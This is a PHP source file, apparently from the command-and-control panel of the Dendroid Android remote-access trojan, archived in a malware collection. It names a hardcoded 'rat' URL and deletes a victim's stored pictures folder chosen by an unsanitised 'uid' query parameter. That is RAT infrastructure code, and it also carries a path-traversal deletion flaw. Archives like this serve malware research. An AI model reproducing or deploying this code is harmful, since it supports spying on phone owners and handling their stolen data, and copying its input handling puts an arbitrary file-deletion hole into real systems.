/*
  name      Dendroid
  type      android
  cve       —
  year      unknown
  os        Android
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?php
  $url = "http://pizzachip.com/rat/";

  if (file_exists("config.php")) {
    include("config.php");
  } else {
    die();
  }
  
  include("functions.php");
  
  $uid = $_GET['uid'];
  
  $path = realpath('dlfiles/' . $uid);
  
  if (is_dir($path . '/')) {
       $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            unlink(realpath($path) . '/' . $file);
        }

    rmdir($path . '/');
	echo "Pictures Deleted";
  } else {
    echo "There was an error.";
    die();
  }
?>